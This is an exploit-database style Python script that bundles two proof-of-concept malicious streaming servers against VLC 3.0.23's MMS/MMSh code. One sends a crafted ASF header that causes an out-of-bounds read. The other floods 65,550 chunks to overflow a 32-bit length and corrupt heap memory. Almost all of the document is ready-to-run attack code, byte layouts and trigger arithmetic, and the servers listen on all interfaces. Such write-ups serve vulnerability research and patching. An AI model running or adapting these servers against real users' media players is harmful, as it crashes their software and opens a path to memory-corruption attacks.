# Exploit Title: VLC 3.0.23 - 'MMS/MMSh' OOB & Integer Overflow 
# Date: 2026-06-11
# Exploit Author: Aryan Chehreghani
# Vendor Homepage: https://www.videolan.org
# Software Link: https://get.videolan.org/vlc/3.0.23/win64/vlc-3.0.23-win64.exe
# Version: 3.0.23
# Tested on: Win-11

#This PoC Demonstrates two distinct memory-safety issues in VLC MMS/MMSh processing:
#VLC MMS/ASF Out-of-Bounds Read
#VLC MMSh Integer Overflow → Heap Out-of-Bounds Write


#!/usr/bin/env python3
"""
VLC MMS/MMSh Combined PoC Launcher
==================================

A single, cross-platform terminal launcher for two existing VLC MMS/MMSh
proof-of-concept servers.

Integrated PoCs:
  1. VLC MMS/ASF OOB Read - CWE-125
     modules/access/mms/buffer.c:197
  2. VLC mmsh.c GetHeader() Integer Overflow - CWE-190 -> CWE-122
     modules/access/mms/mmsh.c:760

Integration policy:
  * The socket, threading, HTTP, mmsh chunking, payload construction, transfer
    counts, and server loops below are preserved from the supplied PoCs.
  * Identifiers are mechanically prefixed with poc1_/poc2_ or POC1_/POC2_ only
    so both implementations can coexist in one Python module.
  * PoC 2 keeps its original argparse parser. The launcher stages a small,
    PoC-2-only sys.argv before invoking it, preventing launcher arguments such
    as --poc2 from reaching the embedded parser.

Authorized use only. Run these servers only against VLC instances and systems
that you own or are explicitly authorized to test.
"""

from __future__ import annotations

import argparse
import ctypes
import os
import socket
import struct
import sys
import threading
import traceback
from typing import Callable, Optional, Sequence, Tuple


APP_NAME = "VLC MMS/MMSh PoC Launcher"
APP_VERSION = "1.0.0"
BANNER_WIDTH = 78
DEFAULT_POC2_PORT = 8889


# =============================================================================
# Cross-platform terminal presentation
# =============================================================================

ANSI = {
    "reset": "\033[0m",
    "bold": "\033[1m",
    "dim": "\033[2m",
    "red": "\033[31m",
    "green": "\033[32m",
    "yellow": "\033[33m",
    "blue": "\033[34m",
    "magenta": "\033[35m",
    "cyan": "\033[36m",
    "white": "\033[37m",
    "bright_red": "\033[91m",
    "bright_green": "\033[92m",
    "bright_yellow": "\033[93m",
    "bright_blue": "\033[94m",
    "bright_magenta": "\033[95m",
    "bright_cyan": "\033[96m",
    "bright_white": "\033[97m",
}

COLOR_ENABLED = False


def _enable_windows_ansi() -> bool:
    """Enable virtual-terminal ANSI processing on Windows when possible."""
    if os.name != "nt":
        return True

    try:
        kernel32 = ctypes.windll.kernel32
        stdout_handle = kernel32.GetStdHandle(-11)  # STD_OUTPUT_HANDLE
        if stdout_handle in (0, -1):
            return False

        mode = ctypes.c_ulong()
        if not kernel32.GetConsoleMode(stdout_handle, ctypes.byref(mode)):
            return False

        ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004
        if mode.value & ENABLE_VIRTUAL_TERMINAL_PROCESSING:
            return True

        return bool(
            kernel32.SetConsoleMode(
                stdout_handle,
                mode.value | ENABLE_VIRTUAL_TERMINAL_PROCESSING,
            )
        )
    except (AttributeError, OSError, ValueError):
        return False


def configure_colors(force_disable: bool = False) -> None:
    """Configure ANSI color support with a graceful monochrome fallback."""
    global COLOR_ENABLED

    if force_disable or os.environ.get("NO_COLOR") is not None:
        COLOR_ENABLED = False
        return

    if not hasattr(sys.stdout, "isatty") or not sys.stdout.isatty():
        COLOR_ENABLED = False
        return

    if os.environ.get("TERM", "").lower() == "dumb":
        COLOR_ENABLED = False
        return

    COLOR_ENABLED = _enable_windows_ansi()


def paint(text: object, *styles: str) -> str:
    """Apply ANSI styles when enabled; otherwise return plain text."""
    rendered = str(text)
    if not COLOR_ENABLED or not styles:
        return rendered
    return "".join(ANSI[style] for style in styles if style in ANSI) + rendered + ANSI["reset"]


def clear_screen(enabled: bool = True) -> None:
    """Clear interactive terminals without emitting escape codes to pipes."""
    if not enabled or not sys.stdout.isatty():
        return
    if COLOR_ENABLED:
        print("\033[2J\033[H", end="")
    else:
        os.system("cls" if os.name == "nt" else "clear")


def rule(character: str = "=", width: int = BANNER_WIDTH, *styles: str) -> None:
    print(paint(character * width, *styles))


def centered(text: str, width: int = BANNER_WIDTH) -> str:
    return text.center(width)


def print_banner() -> None:
    rule("=", BANNER_WIDTH, "bright_cyan", "bold")
    print(paint(centered(APP_NAME.upper()), "bright_white", "bold"))
    print(paint(centered(f"Version {APP_VERSION} | Dual Proof-of-Concept Console"), "cyan"))
    rule("=", BANNER_WIDTH, "bright_cyan", "bold")
    print(
        paint(
            centered("AUTHORIZED SECURITY RESEARCH AND LOCAL VALIDATION ONLY"),
            "bright_yellow",
            "bold",
        )
    )
    print(
        paint(
            centered("Original PoC networking and protocol behavior is preserved"),
            "white",
        )
    )
    rule("-", BANNER_WIDTH, "blue")


def print_section(title: str, subtitle: str = "") -> None:
    print()
    rule("-", BANNER_WIDTH, "bright_magenta")
    print(paint(f" {title}", "bright_magenta", "bold"))
    if subtitle:
        print(paint(f" {subtitle}", "white"))
    rule("-", BANNER_WIDTH, "bright_magenta")


def info(message: str) -> None:
    print(f"{paint('[*]', 'bright_blue', 'bold')} {message}")


def success(message: str) -> None:
    print(f"{paint('[+]', 'bright_green', 'bold')} {message}")


def warning(message: str) -> None:
    print(f"{paint('[!]', 'bright_yellow', 'bold')} {message}")


def error(message: str) -> None:
    print(f"{paint('[-]', 'bright_red', 'bold')} {message}")


def pause() -> None:
    try:
        input(paint("\nPress Enter to return to the main menu...", "dim"))
    except (EOFError, KeyboardInterrupt):
        print()


def print_main_menu() -> None:
    print()
    print(paint(" MAIN MENU", "bright_white", "bold"))
    rule("-", BANNER_WIDTH, "blue")
    print(
        f"  {paint('[1]', 'bright_green', 'bold')} "
        f"{paint('Launch PoC 1', 'bright_white', 'bold')}  "
        "MMS/ASF OOB Read Server"
    )
    print(f"      {paint('CWE-125 | buffer.c:197 | default URL: mmsh://127.0.0.1:8888/', 'dim')}")
    print()
    print(
        f"  {paint('[2]', 'bright_green', 'bold')} "
        f"{paint('Launch PoC 2', 'bright_white', 'bold')}  "
        "MMSH Integer Overflow Server"
    )
    print(f"      {paint('CWE-190 -> CWE-122 | mmsh.c:760 | full or quick profile', 'dim')}")
    print()
    print(
        f"  {paint('[0]', 'bright_yellow', 'bold')} "
        f"{paint('Exit', 'bright_white', 'bold')}"
    )
    rule("-", BANNER_WIDTH, "blue")


def prompt_port(default: int) -> Optional[int]:
    """Prompt for a TCP port; return None when the user cancels."""
    while True:
        raw = input(paint(f"Listen port [{default}] (or 'back'): ", "bright_cyan")).strip()
        if not raw:
            return default
        if raw.lower() in {"back", "b", "cancel", "q", "quit"}:
            return None
        try:
            port = int(raw, 10)
        except ValueError:
            warning("Enter a numeric TCP port from 0 through 65535.")
            continue
        if 0 <= port <= 65535:
            return port
        warning("Port must be in the range 0 through 65535.")


def prompt_poc2_profile() -> Optional[Tuple[bool, int]]:
    """
    Return (quick_mode, port), or None when the user chooses to go back.
    quick_mode=False selects the original full 65,550-chunk transfer.
    """
    while True:
        print()
        print(paint(" POC 2 TRANSFER PROFILE", "bright_white", "bold"))
        rule("-", BANNER_WIDTH, "blue")
        print(f"  {paint('[1]', 'bright_green', 'bold')} Full mode  - 65,550 chunks, approximately 4.0 GiB")
        print(f"  {paint('[2]', 'bright_green', 'bold')} Quick mode -    100 chunks, approximately 6.3 MiB")
        print(f"  {paint('[0]', 'bright_yellow', 'bold')} Back")
        rule("-", BANNER_WIDTH, "blue")

        try:
            choice = input(paint("Select profile: ", "bright_cyan")).strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            return None

        if choice in {"0", "b", "back", "q", "quit"}:
            return None
        if choice in {"1", "f", "full"}:
            quick = False
        elif choice in {"2", "quick", "demo"}:
            quick = True
        else:
            warning("Invalid selection. Choose 1, 2, or 0.")
            continue

        port = prompt_port(DEFAULT_POC2_PORT)
        if port is None:
            continue

        if not quick:
            print()
            warning("Full mode transfers approximately 4.0 GiB and may run for several minutes.")
            try:
                confirm = input(paint("Start full mode? [y/N]: ", "bright_yellow", "bold")).strip().lower()
            except (EOFError, KeyboardInterrupt):
                print()
                return None
            if confirm not in {"y", "yes"}:
                info("Full-mode launch cancelled.")
                continue

        return quick, port


def execute_server(runner: Callable[[], None], interactive: bool) -> None:
    """Execute an embedded PoC and provide launcher-level failure reporting."""
    info("Press Ctrl+C to stop the selected server.")
    print()
    try:
        runner()
    except KeyboardInterrupt:
        # The original server mains normally catch Ctrl+C themselves. This is
        # a final safety net for interruption before those handlers are active.
        print()
        warning("Server interrupted by user.")
    except OSError as exc:
        error(f"Socket startup or communication failed: {exc}")
    except Exception as exc:  # Keep the menu alive after unexpected failures.
        error(f"Unexpected launcher/server error: {exc}")
        traceback.print_exc()

    if interactive:
        print()
        success("Selected PoC execution returned to the launcher.")
        pause()


# =============================================================================
# ORIGINAL PoC 1: VLC MMS/ASF OOB Read - Real-World Impact PoC
# =============================================================================
#
# Mechanical integration changes in this section:
#   * PORT -> POC1_PORT
#   * CRAFTED_ISIZE -> POC1_CRAFTED_ISIZE
#   * ASF_PAYLOAD -> POC1_ASF_PAYLOAD
#   * function names prefixed with poc1_
#
# No protocol fields, byte layouts, socket calls, loops, or message behavior
# were changed.
#
# Original description:
#
# VLC MMS/ASF OOB Read - Real-World Impact PoC
# CWE-125 | modules/access/mms/buffer.c:197
#
# Demonstrates: opening mmsh://127.0.0.1:8888/ in VLC crashes the player.
#
# Usage:
#     1. python poc_server.py          (starts server on port 8888)
#     2. Open VLC -> Media -> Open Network Stream
#        URL:  mmsh://127.0.0.1:8888/
#     3. VLC crashes (access violation in var_buffer_get8)
#
# Protocol:
#     mmsh = MMS over HTTP (RFC: Windows Media HTTP Streaming Protocol)
#     VLC sends HTTP GET, server responds with HTTP 200 then sends
#     ASF data in chunks (type 0x4824 = header chunk).
#     The chunk payload is passed directly to asf_HeaderParse().

POC1_PORT = 8888

# -- Crafted ASF header payload (150 bytes) ----------------------------------
#
# Layout seen by asf_HeaderParse():
#  [0-15]    outer header GUID        (16 bytes, any value)
#  [16-29]   skipped                  (14 bytes)
#  [30-53]   null sub-object #1       (GUID=0 + i_size=0)
#  [54-77]   null sub-object #2
#  [78-101]  null sub-object #3
#  [102-125] null sub-object #4
#  [126-141] null sub-object #5 GUID  (16 bytes)
#  [142-149] i_size = 0x8000000080000017  <- TRIGGER
#
# Trigger path:
#   i_size - 24 = 0x800000007FFFFFFF  (int64: NEGATIVE, int32: +2147483647)
#   __MIN picks the negative int64 -> truncated to int -> large positive int
#   if(i_copy < 0) guard NOT TAKEN -> i_data overflows -> OOB READ
# -----------------------------------------------------------------------------

POC1_CRAFTED_ISIZE = 0x8000000080000017
POC1_ASF_PAYLOAD   = bytearray(142) + struct.pack('<Q', POC1_CRAFTED_ISIZE)   # 150 bytes
assert len(POC1_ASF_PAYLOAD) == 150


def poc1_make_mmsh_chunk(payload: bytes) -> bytes:
    """
    Build one mmsh chunk of type 0x4824 (ASF header chunk).

    GetPacket() in mmsh.c reads:
      4 bytes : [type=0x4824(2)] [size(2)]
      8 bytes : [sequence(4)] [unknown(2)] [size2(2)]
      i_data  : [data bytes]   where i_data = size2 - 8
    """
    size2  = 8 + len(payload)   # i_data = size2 - 8 = len(payload)
    size   = size2               # size >= 8 so full 8-byte header is read

    header = struct.pack('<HHIHH',
        0x4824,     # type
        size,       # size  (>= 8 ensures sequence/unknown/size2 are all read)
        0,          # sequence
        0,          # unknown
        size2       # size2 -> i_data = size2 - 8
    )
    return header + bytes(payload)


def poc1_build_response(payload: bytes) -> bytes:
    chunk = poc1_make_mmsh_chunk(payload)

    http_headers = (
        "HTTP/1.0 200 OK\r\n"
        "Content-Type: application/x-mms-framed\r\n"
        "Pragma: features=broadcast\r\n"
        "Server: MMS PoC (CWE-125 / buffer.c:197)\r\n"
        "\r\n"
    ).encode()

    return http_headers + chunk


def poc1_handle_client(conn: socket.socket, addr):
    print(f"[+] Connection from {addr[0]}:{addr[1]}")
    try:
        # Read HTTP request (VLC sends GET + headers, ends with \r\n\r\n)
        req = b""
        while b"\r\n\r\n" not in req:
            data = conn.recv(4096)
            if not data:
                break
            req += data

        first_line = req.split(b"\r\n")[0].decode(errors="replace")
        print(f"[+] Request: {first_line}")

        # Send the malicious response
        response = poc1_build_response(POC1_ASF_PAYLOAD)
        conn.sendall(response)
        print(f"[+] Sent {len(response)} bytes "
              f"(HTTP headers + 1 mmsh chunk with {len(POC1_ASF_PAYLOAD)}-byte crafted ASF data)")
        print("[*] VLC should crash in asf_HeaderParse() now...")

    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        conn.close()


def poc1_main():
    print("=" * 60)
    print(" VLC MMS/ASF OOB Read - Impact PoC Server")
    print(" CWE-125 | modules/access/mms/buffer.c:197")
    print("=" * 60)
    print()
    print(f"[*] Listening on mmsh://127.0.0.1:{POC1_PORT}/")
    print()
    print(f"  Open VLC -> Media -> Open Network Stream")
    print(f"  URL:  mmsh://127.0.0.1:{POC1_PORT}/")
    print()
    print("[*] Crafted i_size = 0x8000000080000017")
    print("[*] i_size - 24 = 0x800000007FFFFFFF")
    print("[*]   as int64_t  : -9223372034707292161 (negative)")
    print("[*]   as int32    : +2147483647          (bypasses guard)")
    print("[*] i_data overflows: 150 + 2147483647 = -2147483499")
    print("[*] var_buffer_get8: -2147483499 >= 152 -> False -> OOB READ")
    print()

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", POC1_PORT))
    srv.listen(5)

    try:
        while True:
            conn, addr = srv.accept()
            threading.Thread(target=poc1_handle_client, args=(conn, addr),
                             daemon=True).start()
    except KeyboardInterrupt:
        print("\n[*] Server stopped.")
    finally:
        srv.close()


# =============================================================================
# ORIGINAL PoC 2: VLC mmsh.c GetHeader() Integer Overflow
# =============================================================================
#
# Mechanical integration changes in this section:
#   * PORT/BUFFER_SIZE/MAX_CK_DATA/etc. received POC2_ prefixes
#   * function names prefixed with poc2_
#
# No protocol fields, byte layouts, socket calls, chunk counts, loops, or
# transfer behavior were changed.
#
# Original description:
#
# VLC mmsh.c GetHeader() Integer Overflow - Real-World Impact PoC
# CWE-190 -> CWE-122 | modules/access/mms/mmsh.c:760
#
# Root cause:
#     p_sys->i_header is a signed 32-bit int. GetHeader() calls:
#         p_sys->i_header += ck.i_data;
#     After 65549 large chunks (each 65524 bytes), i_header overflows
#     from INT32_MAX back to a small positive value (100).
#     xrealloc(p_header, 100) + memcpy(&p_header[-65424], ..., 65524)
#     -> heap buffer overflow (65524-byte OOB write backward)
#
# Observable effect in practice:
#     Sending 4 GB worth of chunks via localhost causes VLC's xrealloc()
#     to eventually abort() with OOM (exit code 0xC0000005 or -1073741819)
#     before the int32 overflow completes (~50% of required data = ~2GB alloc).
#     This is a reliable 2-3 minute DoS crash against VLC.
#
#     The standalone PoC (poc2_standalone.c) demonstrates the integer
#     overflow and OOB write primitive without the OOM barrier.
#
# Usage:
#     1. python poc2_server.py          (starts server on port 8889)
#     2. Open VLC -> Media -> Open Network Stream
#        URL:  mmsh://127.0.0.1:8889/
#     3. VLC grows memory rapidly then crashes (OOM abort or access violation)
#        Expected exit code: 0xC0000005 (STATUS_ACCESS_VIOLATION)
#                         or 0xC0000017 (STATUS_NO_MEMORY)
#
#     NOTE: This sends ~4 GB of data. Expect 2-5 minutes.
#     Use --quick mode to demonstrate only the start of overflow path.

POC2_PORT = 8889

POC2_BUFFER_SIZE = 65536
POC2_MAX_CK_DATA = POC2_BUFFER_SIZE - 12   # 65524 bytes per chunk

# Number of chunks to trigger the int32 overflow:
#   i_header starts at 0
#   Each chunk adds POC2_MAX_CK_DATA = 65524
#   Overflow at: ceil(2^32 / 65524) = 65550 chunks
#   i_header after 65549 chunks = 65549 * 65524 = 4294901876
#                                                = 0xFFFF0034 (still positive)
#   One more chunk: 0xFFFF0034 + 65524 = 0x100000000 + 100 -> wraps to 100
POC2_CHUNKS_TO_OVERFLOW = 65550

# Quick mode: just show VLC starts accumulating memory
POC2_CHUNKS_QUICK = 100


def poc2_make_mmsh_chunk(payload: bytes, seq: int = 0) -> bytes:
    """
    mmsh 0x4824 chunk header (12 bytes) + payload.
    i_data = size2 - 8 = len(payload) in GetPacket().
    """
    size2 = 8 + len(payload)
    header = struct.pack('<HHIHH',
        0x4824,   # type  (ASF header chunk)
        size2,    # size
        seq,      # sequence
        0,        # unknown
        size2     # size2 -> i_data = size2-8 = len(payload)
    )
    return header + bytes(payload)


def poc2_build_http_headers() -> bytes:
    return (
        "HTTP/1.0 200 OK\r\n"
        "Content-Type: application/x-mms-framed\r\n"
        "Pragma: features=broadcast\r\n"
        "Server: mmsh-overflow-poc\r\n"
        "\r\n"
    ).encode()


def poc2_handle_client(conn: socket.socket, addr, max_chunks: int):
    print(f"[+] Connection from {addr[0]}:{addr[1]}")
    try:
        req = b""
        while b"\r\n\r\n" not in req:
            data = conn.recv(4096)
            if not data:
                break
            req += data

        first_line = req.split(b"\r\n")[0].decode(errors="replace")
        print(f"[+] Request: {first_line}")

        conn.sendall(poc2_build_http_headers())
        print(f"[*] Sending {max_chunks} chunks x {POC2_MAX_CK_DATA} bytes each")
        print(f"[*] Total payload: {max_chunks * POC2_MAX_CK_DATA / 1024 / 1024:.1f} MB")
        print(f"[*] i_header will reach: {max_chunks * POC2_MAX_CK_DATA:,} after all chunks")
        print()

        chunk_payload = b'\x41' * POC2_MAX_CK_DATA   # attacker-controlled 'A' bytes

        sent = 0
        for i in range(max_chunks):
            chunk = poc2_make_mmsh_chunk(chunk_payload, seq=i)
            try:
                conn.sendall(chunk)
            except BrokenPipeError:
                print(f"[!] VLC disconnected at chunk {i} (crashed or closed)")
                return
            sent += 1
            if sent % 1000 == 0:
                i_header_now = (sent * POC2_MAX_CK_DATA) & 0xFFFFFFFF
                i_header_signed = i_header_now if i_header_now < 2**31 else i_header_now - 2**32
                print(f"[*] chunk {sent:6d} / {max_chunks}  |  "
                      f"i_header = {i_header_signed:12,}  "
                      f"(0x{i_header_now:08X})")

        print(f"\n[+] Sent all {max_chunks} chunks.")
        print(f"[*] If VLC is still running, i_header has overflowed.")
        print(f"[*] Final i_header = {(max_chunks * POC2_MAX_CK_DATA) & 0xFFFFFFFF:,}")
        print(f"[*]                = {(max_chunks * POC2_MAX_CK_DATA) & 0xFFFFFFFF:#010x}")

    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        conn.close()
        print("[*] Connection closed.")


def poc2_main():
    parser = argparse.ArgumentParser(
        description="VLC mmsh.c i_header integer overflow PoC server"
    )
    parser.add_argument("--quick", action="store_true",
                        help=f"Send only {POC2_CHUNKS_QUICK} chunks (fast demo, no overflow)")
    parser.add_argument("--port", type=int, default=POC2_PORT,
                        help=f"Listen port (default {POC2_PORT})")
    args = parser.parse_args()

    max_chunks = POC2_CHUNKS_QUICK if args.quick else POC2_CHUNKS_TO_OVERFLOW

    print("=" * 65)
    print(" VLC mmsh.c Integer Overflow -> Heap OOB Write  (PoC Server)")
    print(" CWE-190 -> CWE-122 | mmsh.c:760")
    print("=" * 65)
    print()
    print(f"[*] Listening on mmsh://127.0.0.1:{args.port}/")
    print()
    print(f"  Open VLC -> Media -> Open Network Stream")
    print(f"  URL:  mmsh://127.0.0.1:{args.port}/")
    print()
    if args.quick:
        print(f"[*] QUICK MODE: {POC2_CHUNKS_QUICK} chunks only (demonstrates memory growth)")
    else:
        print(f"[*] FULL MODE: {POC2_CHUNKS_TO_OVERFLOW:,} chunks to trigger int32 overflow")
        print(f"[*] Transfer: ~{POC2_CHUNKS_TO_OVERFLOW * POC2_MAX_CK_DATA / 1024**3:.1f} GB  (expect 2-5 min)")
        print(f"[*] Observable: VLC OOM crash (abort) or heap corruption")
    print()
    print(" Overflow math:")
    print(f"   i_header type      : int (signed 32-bit)")
    print(f"   chunks to overflow : {POC2_CHUNKS_TO_OVERFLOW:,}")
    print(f"   bytes per chunk    : {POC2_MAX_CK_DATA}")
    print(f"   total bytes        : {POC2_CHUNKS_TO_OVERFLOW * POC2_MAX_CK_DATA:,}  (4 GB)")
    print(f"   i_header wraps to  : {(POC2_CHUNKS_TO_OVERFLOW * POC2_MAX_CK_DATA) & 0x7FFFFFFF}  (near 0)")
    print()

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", args.port))
    srv.listen(5)

    try:
        while True:
            conn, addr = srv.accept()
            threading.Thread(
                target=poc2_handle_client,
                args=(conn, addr, max_chunks),
                daemon=True
            ).start()
    except KeyboardInterrupt:
        print("\n[*] Server stopped.")
    finally:
        srv.close()


def invoke_poc2(quick: bool = False, port: Optional[int] = None) -> None:
    """
    Invoke PoC 2 while preserving its original argparse-based main function.

    The combined program's own command line must not be passed to the embedded
    PoC parser. A temporary PoC-2-only argv is staged and restored afterward.
    """
    original_argv = sys.argv[:]
    staged_argv = [original_argv[0] if original_argv else "poc2_server.py"]
    if quick:
        staged_argv.append("--quick")
    if port is not None:
        staged_argv.extend(["--port", str(port)])

    sys.argv = staged_argv
    try:
        poc2_main()
    finally:
        sys.argv = original_argv


# =============================================================================
# Launcher command line and menu
# =============================================================================


def build_launcher_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog=os.path.basename(sys.argv[0]) or "VLC_MMS_PoC_Launcher.py",
        description=(
            "Cross-platform launcher for two preserved VLC MMS/MMSh PoC servers. "
            "Run without --poc1/--poc2 to use the interactive menu."
        ),
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    mode = parser.add_mutually_exclusive_group()
    mode.add_argument("--poc1", action="store_true",
                      help="directly launch the MMS/ASF OOB Read PoC server")
    mode.add_argument("--poc2", action="store_true",
                      help="directly launch the MMSH integer-overflow PoC server")
    parser.add_argument("--quick", action="store_true",
                        help="with --poc2, send only 100 chunks")
    parser.add_argument("--port", type=int, default=None,
                        help="with --poc2, override the listen port")
    parser.add_argument("--no-color", action="store_true",
                        help="disable ANSI colors")
    parser.add_argument("--no-clear", action="store_true",
                        help="do not clear the terminal before the menu")
    parser.add_argument("--version", action="version",
                        version=f"{APP_NAME} {APP_VERSION}")
    return parser


def validate_launcher_args(parser: argparse.ArgumentParser, args: argparse.Namespace) -> None:
    if args.quick and not args.poc2:
        parser.error("--quick can only be used with --poc2")
    if args.port is not None and not args.poc2:
        parser.error("--port can only be used with --poc2")
    if args.port is not None and not (0 <= args.port <= 65535):
        parser.error("--port must be between 0 and 65535")


def launch_poc1(interactive: bool) -> None:
    print_section(
        "POC 1 | VLC MMS/ASF OOB READ",
        "CWE-125 | modules/access/mms/buffer.c:197 | fixed port 8888",
    )
    execute_server(poc1_main, interactive)


def launch_poc2(quick: bool, port: Optional[int], interactive: bool) -> None:
    profile = "QUICK" if quick else "FULL"
    selected_port = DEFAULT_POC2_PORT if port is None else port
    print_section(
        "POC 2 | VLC MMSH INTEGER OVERFLOW",
        f"CWE-190 -> CWE-122 | modules/access/mms/mmsh.c:760 | {profile} mode | port {selected_port}",
    )
    execute_server(lambda: invoke_poc2(quick=quick, port=port), interactive)


def interactive_menu(no_clear: bool = False) -> int:
    clear_screen(enabled=not no_clear)
    print_banner()

    while True:
        print_main_menu()
        try:
            choice = input(paint("Select an option [0-2]: ", "bright_cyan", "bold")).strip().lower()
        except EOFError:
            print()
            info("Input closed; exiting launcher.")
            return 0
        except KeyboardInterrupt:
            print()
            info("Launcher interrupted; exiting.")
            return 130

        if choice in {"0", "exit", "quit", "q"}:
            success("Launcher closed.")
            return 0

        if choice == "1":
            launch_poc1(interactive=True)
            clear_screen(enabled=not no_clear)
            print_banner()
            continue

        if choice == "2":
            profile = prompt_poc2_profile()
            if profile is None:
                info("PoC 2 launch cancelled; returning to main menu.")
                continue
            quick, port = profile
            launch_poc2(quick=quick, port=port, interactive=True)
            clear_screen(enabled=not no_clear)
            print_banner()
            continue

        warning("Invalid menu selection. Choose 1, 2, or 0.")


def main(argv: Optional[Sequence[str]] = None) -> int:
    parser = build_launcher_parser()
    args = parser.parse_args(argv)
    validate_launcher_args(parser, args)
    configure_colors(force_disable=args.no_color)

    if args.poc1:
        launch_poc1(interactive=False)
        return 0

    if args.poc2:
        launch_poc2(quick=args.quick, port=args.port, interactive=False)
        return 0

    return interactive_menu(no_clear=args.no_clear)


if __name__ == "__main__":
    raise SystemExit(main())
